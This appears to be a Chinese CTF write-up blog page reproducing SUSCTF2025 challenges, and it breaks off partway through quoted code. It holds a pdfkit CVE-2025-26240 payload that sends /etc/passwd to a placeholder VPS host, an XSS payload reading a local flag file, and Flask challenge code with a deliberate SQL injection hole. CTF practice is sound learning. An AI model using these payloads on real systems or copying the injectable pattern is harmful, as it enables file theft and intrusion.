@@ -1,0 +1,834 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    SUSCTF2025题目复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="不中了，签到题是go，我没学过… [TOC]  Web  am i admin? 直接放官方题解了   am i admin? 2   easyprint（pdfkit—CVE-2025-26240） 唯一做出来的一个题 该题是一个html转pdf的工具 一眼扫到了一个主要依赖  直接搜漏洞，找到CVE-2025-26240 直接能进行外带文件读取: 123456&lt;meta name&#x3D;&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUSCTF2025题目复现">
+<meta property="og:url" content="http://example.com/2025/10/14/SUSCTF2025%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="不中了，签到题是go，我没学过… [TOC]  Web  am i admin? 直接放官方题解了   am i admin? 2   easyprint（pdfkit—CVE-2025-26240） 唯一做出来的一个题 该题是一个html转pdf的工具 一眼扫到了一个主要依赖  直接搜漏洞，找到CVE-2025-26240 直接能进行外带文件读取: 123456&lt;meta name&#x3D;&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014110704080.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014110723508.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014111131622.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014123622488.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014123718011.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014123725528.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014123913622.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014124029344.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014125905428.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014131140215.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014131313160.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014135210090.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014135634606.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014140035613.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014140333136.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014141453569.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014141938316.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014142024389.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014142400221.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014143723155.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014143841008.png">
+<meta property="og:image" content="http://example.com/2025/10/14/images/image-20251014143902605.png">
+<meta property="article:published_time" content="2025-10-14T02:58:57.000Z">
+<meta property="article:modified_time" content="2025-12-10T08:16:04.964Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="PHP内置接口反序列化">
+<meta property="article:tag" content="Python的PostgreSQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/10/14/images/image-20251014110704080.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="SUSCTF2025题目复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">SUSCTF2025题目复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin"><span class="toc-number">1.1.</span> <span class="toc-text"> am i admin?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#am-i-admin-2"><span class="toc-number">1.2.</span> <span class="toc-text"> am i admin? 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyprintpdfkitcve-2025-26240"><span class="toc-number">1.3.</span> <span class="toc-text"> easyprint（pdfkit—CVE-2025-26240）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#susmarketpython%E7%9A%84postgresql%E6%B3%A8%E5%85%A5%E5%90%8E%E5%8D%87%E7%BA%A7%E4%B8%BArce"><span class="toc-number">1.4.</span> <span class="toc-text"> SUSMarket(Python的PostgreSQL注入，后升级为RCE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#make-php-greater-againphp%E5%86%85%E7%BD%AE%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text"> make php greater again(PHP内置接口反序列化)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 找链子</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-all-u-need"><span class="toc-number">2.1.</span> <span class="toc-text"> 01-All U Need</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pentest"><span class="toc-number">3.</span> <span class="toc-text"> Pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-1jndi%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text"> pen4ruo1-1(JNDI注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pen4ruo1-2"><span class="toc-number">3.2.</span> <span class="toc-text"> pen4ruo1-2</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-SUSCTF2025题目复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/10/14/SUSCTF2025%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-10-14T02:58:57.000Z" itemprop="datePublished">2025-10-14</time>
+    <time style="display: none;" id="post-update-time">2025-12-10</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>不中了，签到题是go，我没学过…</p>
+<p>[TOC]</p>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="am-i-admin"><a class="markdownIt-Anchor" href="#am-i-admin"></a> am i admin?</h3>
+<p>直接放官方题解了</p>
+<p><img src="../images/image-20251014110704080.png" alt="image-20251014110704080" /></p>
+<h3 id="am-i-admin-2"><a class="markdownIt-Anchor" href="#am-i-admin-2"></a> am i admin? 2</h3>
+<p><img src="../images/image-20251014110723508.png" alt="image-20251014110723508" /></p>
+<h3 id="easyprintpdfkitcve-2025-26240"><a class="markdownIt-Anchor" href="#easyprintpdfkitcve-2025-26240"></a> easyprint（pdfkit—CVE-2025-26240）</h3>
+<p>唯一做出来的一个题</p>
+<p>该题是一个html转pdf的工具</p>
+<p>一眼扫到了一个主要依赖</p>
+<p><img src="../images/image-20251014111131622.png" alt="image-20251014111131622" /></p>
+<p>直接搜漏洞，找到<a target="_blank" rel="noopener" href="https://github.com/JazzCore/python-pdfkit/issues/267">CVE-2025-26240</a></p>
+<p>直接能进行外带文件读取:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit---quiet&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit---enable-local-file-access&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit---post-file&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit-file--a&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;/etc/passwd&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit-VPS:IP/?LFI-TEST=--&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;--cache-dir&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>LFI POC<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>官方题解也提供一种 XSS 的打法，直接将 flag 嵌入 pdf：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit---enable-javascript&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&#x27;pdfkit---enable-local-file-access&#x27;</span> <span class="attr">content</span>=<span class="string">&#x27;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello PDF<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>This is sample text that will be converted to PDF.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> x = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//当请求成功时，用服务器返回的内容替换整个页面内容</span></span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);&#125;</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;failed!&#x27;</span>)&#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//尝试通过 GET 方式访问本地文件系统中的 /flag 文件</span></span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;file:///flag&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当然这个 wkhtmltopdf 停止维护的部分原因是 QtWebKit 长期处在<a target="_blank" rel="noopener" href="https://github.com/qt/qtwebkit">没人管</a>的状态；如果你足够无聊的话，大概能从里面找到三千万个 webkit 的历史遗留漏洞，其中应该有不少能 RCE。</p>
+<h3 id="susmarketpython的postgresql注入后升级为rce"><a class="markdownIt-Anchor" href="#susmarketpython的postgresql注入后升级为rce"></a> SUSMarket(Python的PostgreSQL注入，后升级为RCE)</h3>
+<p><img src="../images/image-20251014123622488.png" alt="image-20251014123622488" /></p>
+<p><img src="../images/image-20251014123718011.png" alt="image-20251014123718011" /></p>
+<p><img src="../images/image-20251014123725528.png" alt="image-20251014123725528" /></p>
+<p>以上就是所有题目信息</p>
+<p>这里能搜索：</p>
+<p><img src="../images/image-20251014123913622.png" alt="image-20251014123913622" /></p>
+<p>猜测存在SQL注入</p>
+<p>但输入<code>flag'</code>会发现：<br />
+<img src="../images/image-20251014124029344.png" alt="image-20251014124029344" /></p>
+<p>会跳转到list页面并回显存在危险字符</p>
+<p>很明显被过滤了</p>
+<p>自己做实属做不出来，从题解扒过来源码看看：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> psycopg_pool <span class="keyword">import</span> ConnectionPool</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">pool = ConnectionPool(</span><br><span class="line">    conninfo=<span class="string">&quot;dbname=susmarket user=sus password=xxxxxxxxxx host=localhost port=5432&quot;</span>,</span><br><span class="line">    min_size=<span class="number">1</span>,</span><br><span class="line">    max_size=<span class="number">10</span>,</span><br><span class="line">    max_lifetime=<span class="number">30</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#waf了单双引号</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;market&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/market&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">market</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;market.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_products</span>():</span><br><span class="line">    <span class="keyword">with</span> pool.connection() <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cur:</span><br><span class="line">            cur.execute(</span><br><span class="line">                <span class="string">&quot;SELECT id, product_name, price, stock FROM products ORDER BY id;&quot;</span></span><br><span class="line">            )</span><br><span class="line">            products = cur.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;list.html&quot;</span>, products=products)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_products</span>():</span><br><span class="line">    products = []</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        product_name = request.form.get(<span class="string">&quot;product_name&quot;</span>, <span class="string">&quot;&quot;</span>).strip()</span><br><span class="line">        <span class="keyword">if</span> waf(product_name):</span><br><span class="line">            flash(<span class="string">&quot;Dangerous traffic detected!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;list_products&quot;</span>))</span><br><span class="line">        <span class="keyword">with</span> pool.connection() <span class="keyword">as</span> conn:</span><br><span class="line">            <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cur:</span><br><span class="line">                cur.execute(</span><br><span class="line">                    <span class="string">f&quot;SELECT id, product_name, price, stock FROM products WHERE product_name ILIKE &#x27;%<span class="subst">&#123;product_name&#125;</span>%&#x27;;&quot;</span></span><br><span class="line">                )</span><br><span class="line">                products = cur.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>, products=products)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/buy/&lt;product_id&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy_product</span>(<span class="params">product_id</span>):</span><br><span class="line">    <span class="keyword">if</span> waf(product_id):</span><br><span class="line">        flash(<span class="string">&quot;Dangerous traffic detected!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;list_products&quot;</span>))</span><br><span class="line">    <span class="keyword">with</span> pool.connection() <span class="keyword">as</span> conn:</span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cur:</span><br><span class="line">            cur.execute(</span><br><span class="line">                <span class="string">f&quot;SELECT id, product_name, price, stock, description FROM products WHERE id = <span class="subst">&#123;product_id&#125;</span>;&quot;</span></span><br><span class="line">            )</span><br><span class="line">            product = cur.fetchone()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> product:</span><br><span class="line">            flash(<span class="string">&quot;Product not found.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;list_products&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            qty = <span class="built_in">int</span>(request.form.get(<span class="string">&quot;quantity&quot;</span>, <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">if</span> qty &lt;= <span class="number">0</span>:</span><br><span class="line">                flash(<span class="string">&quot;Invalid quantity.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> product[<span class="number">3</span>] &lt; qty:</span><br><span class="line">                flash(<span class="string">&quot;Not enough stock.&quot;</span>, <span class="string">&quot;warning&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_stock = product[<span class="number">3</span>] - qty</span><br><span class="line">                <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cur:</span><br><span class="line">                    cur.execute(</span><br><span 